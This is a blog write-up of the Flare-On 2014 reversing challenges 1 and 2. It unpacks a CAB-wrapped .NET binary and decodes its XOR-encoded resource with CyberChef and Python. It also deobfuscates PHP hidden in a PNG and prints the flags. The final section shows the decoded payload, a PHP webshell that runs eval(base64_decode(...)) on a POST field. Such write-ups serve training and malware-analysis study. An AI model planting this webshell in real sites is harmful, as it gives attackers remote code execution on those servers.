---
title: Flare-On 2014 Jan 2026
published: 2026-01-18
description: Writeup of Flare-On 2014.
tags:
  - Reversing
  - Flare-On
  - dnSpy
  - DotNET
image: images/cover.png
category: Flare-On Reversing Writeups
draft: false
---

- **Category: DotNET Reversing**
- **Difficulty: Easy**
- File:- [2014_FLAREOn_Challenges.zip](/uploads/Flare-On_2014/2014_FLAREOn_Challenges.zip)

# Challenge 1 - Bob Doge

## Stage 1 Extracting CAB File
### Initial Triage

- File Type: PE32+ executable for MS Windows 5.02 (GUI), x86-64, 6 sections
- Size: 279 KB
- SHA256: f8aac4d0cccabd11d7b10d63dc2acc451ea832077650971d3c66834861162981

### Basic Static Analysis:

- Detect it Easy (Die) show that this file is **self-extracted CAB/SFX style packing**, where the executable includes a compressed Microsoft Cabinet file (CAB) and extracts/executes it at runtime and it is just a **wrapper/loader**.
- The `.rsrc` section is compressed, which is why the tool flags **high entropy**, classic sign of packing or encryption.
- Compression algorithm used inside the CAB is **LZX** (as shown), which is common in Microsoft CAB archives.
- So we have to first extract the actual exe from this and analyze it,

![Pasted image 20260118140836.png](images/Pasted_image_20260118140836.png)

![Pasted image 20260118141726.png](images/Pasted_image_20260118141726.png)

- We can extract it using [cabextract](https://www.cabextract.org.uk/) tool, and it will written in `Challenge1.exe` file,

```bash
┌──(b14cky㉿DESKTOP-VRSQRAJ)-[/]
└─$ cabextract C1.exe.defused
Extracting cabinet: C1.exe.defused
  extracting Challenge1.exe

All done, no errors.
```

## Stage 2 Analysis of .NET Sample

### Initial Triage

- File Type: PE32 executable for MS Windows 4.00 (GUI), Intel i386 Mono/.Net assembly, 3 sections
- Size: 118 KB
- SHA256: c1b55c829a8420fa41e7a31344b6427045cea288458fe1c0f32cae47b2e812f2
### Basic Static Analysis:

- Detect it Easy (Die) show that this file is `.NET` binary written in `C#` using visual studio.
- Also `.text` is packed as per die because it show high entropy in it. 
 
![Pasted image 20260118142239.png](images/Pasted_image_20260118142239.png)

![Pasted image 20260118142850.png](images/Pasted_image_20260118142850.png)

- We know that this code compiles to **Microsoft Intermediate Language (MSIL or IL)**.
- IL is a **human-readable, high-level assembly-like language**, not raw CPU instructions.
- So we can read it using tools such as `dnSpy`, `Dotpeek` etc.
- here is the example of IL,

```asm
.method public hidebysig static void Main() cil managed
{
    .entrypoint
    ldstr "Hello, world!"
    call void [mscorlib]System.Console::WriteLine(string)
    ret
}
```

### Code Analysis

![Pasted image 20260118143113.png](images/Pasted_image_20260118143113.png)

- I used `dnSpy` for this analysis,
- In `Resources` i found something phishy which is `rev_challenge_1.dat_secret.encode` so i saved it and it looks like encrypted data,
- Also some cool memes 😂,

![Pasted image 20260118143314.png](images/Pasted_image_20260118143314.png)

![Pasted image 20260118143648.png](images/Pasted_image_20260118143648.png)

- Now Let's dive into actual code, so typically we start with `main` function in `Program` section,
- This code just **starts a Windows Forms GUI app and opens Form1** so `Form1` is the one we had to go,

![Pasted image 20260118143831.png](images/Pasted_image_20260118143831.png)

- Immediately we see one function `btnDecode_Click` which do some kind of math or crypto stuff, and it is loading that `rev_challenge_1.dat_secret.encode` file as input.

![Pasted image 20260118144043.png](images/Pasted_image_20260118144043.png)

- At first glance, honestly, I can't understand this code, so I take help from our friend GPT to explain it to me, and here is what I understand,

```asm
0xa1 0xb5 0x44        (original)
0x1a 0x5b 0x44        (swap hex digits)
(0x1a ^ 0x29) (0x5b ^ 0x29) (0x44 ^ 0x29) → 0x33 0x72 0x6d
```

### Flag Extraction

- So i load this input file into `CyberChef` and apply all the necessary filters and features to get decrypted result and here it is,

![Pasted image 20260118145903.png](images/Pasted_image_20260118145903.png)

- Here is out flag,

```yml
 3rmahg3rd.b0b.d0ge@flare-on.com
```

- Here is recipe of this,

```json
[
  { "op": "To Hex",
    "args": ["Space", 0] },
  { "op": "Remove whitespace",
    "args": [true, true, true, true, true, false] },
  { "op": "Find / Replace",
    "args": [{ "option": "Regex", "string": "([0-9a-fA-F])([0-9a-fA-F])" }, "$2$1", true, false, true, false] },
  { "op": "Remove whitespace",
    "args": [true, true, true, true, true, false] },
  { "op": "From Hex",
    "args": ["Auto"] },
  { "op": "XOR",
    "args": [{ "option": "Decimal", "string": "41" }, "Standard", false] }
]
```

- Here is the similar py script for doing this same task,

```py
#!/usr/bin/env python3
"""
Replicates CyberChef operations:
1. From Hexdump
2. To Hex (space delimited)
3. Remove whitespace
4. Find/Replace (swap hex digit pairs)
5. Remove whitespace
6. From Hex
7. XOR with 41 (decimal)
"""

import re
import sys

def from_hexdump(data):
    """Extract hex bytes from hexdump format"""
    lines = data.strip().split('\n')
    hex_bytes = []
    
    for line in lines:
        # Remove offset and ASCII representation, keep only hex bytes
        parts = line.split()
        for part in parts:
            # Skip offset (contains colon) and non-hex parts
            if ':' in part or not all(c in '0123456789abcdefABCDEF' for c in part):
                continue
            # Add hex bytes (typically 2 chars each)
            for i in range(0, len(part), 2):
                if i + 1 < len(part):
                    hex_bytes.append(part[i:i+2])
    
    return bytes.fromhex(''.join(hex_bytes))

def to_hex_space(data):
    """Convert bytes to space-separated hex"""
    return ' '.join(f'{b:02x}' for b in data)

def remove_whitespace(text):
    """Remove all whitespace"""
    return re.sub(r'\s+', '', text)

def swap_hex_pairs(text):
    """Swap each pair of hex digits: AB -> BA"""
    return re.sub(r'([0-9a-fA-F])([0-9a-fA-F])', r'\2\1', text)

def from_hex(hex_string):
    """Convert hex string to bytes"""
    return bytes.fromhex(hex_string)

def xor_decrypt(data, key):
    """XOR each byte with the key"""
    return bytes(b ^ key for b in data)

def main():
    input_file = 'rev_challenge_1.dat_secret.encode'
    
    try:
        # Read input file in binary mode
        with open(input_file, 'rb') as f:
            data = f.read()
        
        print(f"[+] Reading from {input_file}")
        
        # Step 1: From Hexdump - skip this step, data is already binary
        print("[+] Step 1: Using binary data directly")
        step1 = data
        
        # Step 2: To Hex (space delimited)
        print("[+] Step 2: To Hex (space delimited)")
        step2 = to_hex_space(step1)
        
        # Step 3: Remove whitespace
        print("[+] Step 3: Remove whitespace")
        step3 = remove_whitespace(step2)
        
        # Step 4: Find/Replace - swap hex digit pairs
        print("[+] Step 4: Swap hex digit pairs")
        step4 = swap_hex_pairs(step3)
        
        # Step 5: Remove whitespace (again)
        print("[+] Step 5: Remove whitespace")
        step5 = remove_whitespace(step4)
        
        # Step 6: From Hex
        print("[+] Step 6: From Hex")
        step6 = from_hex(step5)
        
        # Step 7: XOR with 41 (decimal)
        print("[+] Step 7: XOR with 41")
        result = xor_decrypt(step6, 41)
        
        # Output result
        print("\n" + "="*60)
        print("DECODED OUTPUT:")
        print("="*60)
        try:
            print(result.decode('utf-8', errors='replace'))
        except:
            print(result)
        print("="*60)
        
        # Save to file
        output_file = 'decoded_output.txt'
        with open(output_file, 'wb') as f:
            f.write(result)
        print(f"\n[+] Output saved to {output_file}")
        
    except FileNotFoundError:
        print(f"[!] Error: File '{input_file}' not found")
        print(f"[!] Please ensure the file exists in the current directory")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
```

# Challenge 2: Javascrap

## Stage 0 Character Table Construction

### Initial Triage

- Challenge Type: Reverse-Engineering / Web / Obfuscated Code
- Files Provided:
    - `home.html`
	    - File Type: home.html: HTML document, Unicode text, UTF-8 text, with very long lines (1428), with CRLF line terminators
		- Size: 8.17 KB
		- SHA256: d1b235e49336c2e510100bd3ffa3113d9c757ffb4829e9564597dbab8338b710
    - `img/flare-on.png` (PNG image) 
	    - File Type: img/flare-on.png: PNG image data, 400 x 79, 8-bit/color RGBA, non-interlaced
		- Size: 9.33 KB
		- SHA256: 87528d13f40b51b6de90124fb92bcbc38a54e5241cd7ef969208c0707ed893dd

### Basic Static Analysis:

- The PNG is being **included as PHP code** via an `include` in the HTML page: i.e., the challenge hides a PHP script inside what looks like an image.

![Pasted image 20260119201225.png](images/Pasted_image_20260119201225.png)

- Performing strings on `flare-on.png` reveals appended PHP source code instead of pure image data.

![Pasted image 20260119201531.png](images/Pasted_image_20260119201531.png)

- The appended PHP contains two large arrays: `$terms` and `$order`, and a reconstruction loop that builds a second PHP script dynamically. 

## Stage 1: Obfuscation Decoding

### 1: Character Table Reconstruction

The embedded PHP begins:

![Pasted image 20260119202546.png](images/Pasted_image_20260119202546.png)

```php
$terms = array("M","Z","]","p",...,"|");
$order = array(59,71,73,13,...,47);
$do_me="";
for($i=0;$i<count($order);$i++){
    $do_me=$do_me.$terms[$order[$i]];
}
print($do_me);
```

- `$terms` is a **custom character lookup table** - each entry is a single character.
- `$order` is a list of integers, each an index into `$terms`. 
- The loop concatenates `$terms[$order[i]]` to form a complete PHP script string in `$do_me`. 
- Instead of running `eval()` immediately, you can replace it with `print` to **dump the generated code** for analysis. 

## Stage 2: Second-Layer Decoding

After reconstructing the inner PHP, the output looks like:

![Pasted image 20260119202723.png](images/Pasted_image_20260119202723.png)

```php
$_  = 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlc ...';
$__ = 'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';
$___ = "\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
eval($___($__));
```

- `$_` and `$__` are **Base64-encoded** strings. 
- `$___` is obfuscated with **hex escape sequences** representing the string `base64_decode`. 
- `eval($___($__))` resolves to:

```php
$code = base64_decode($_);
eval($code);
```

This decodes the next stage of the script and executes it. 

## Stage 3: Escaped Payload Interpretation

![Pasted image 20260119202813.png](images/Pasted_image_20260119202813.png)

The inner decoded PHP is:

```php
if (isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F..."])){
    eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104..."]));
}
```

- The `$_POST` key names are obfuscated using a **mix of octal (`\NNN`) and hex (`\xNN`) escapes**. 
- To understand the actual identifier, all escape sequences must be converted into ASCII. 

## Stage 4: Normalization and Flag Extraction

![Pasted image 20260119202842.png](images/Pasted_image_20260119202842.png)

The decoded sequence:

```
a11DOTthatDOTjava5crapATflareDASHonDOTcom
```

comes from interpreting those escape sequences as numbers and converting them to characters.   
Replace placeholder tokens:

- `DOT` → `.`
- `AT` → `@`
- `DASH` → `-`

- Final flag:

```yml
a11.that.java5crap@flare-on.com
```

## Final Behavior

The decoded PHP callback becomes:

```php
if (isset($_POST["a11.that.java5crap@flare-on.com"])) {
    eval(base64_decode($_POST["a11.that.java5crap@flare-on.com"]));
}
```

- This is a **simple PHP webshell** that executes Base64-encoded PHP from an HTTP POST field if sent under the correct key. 
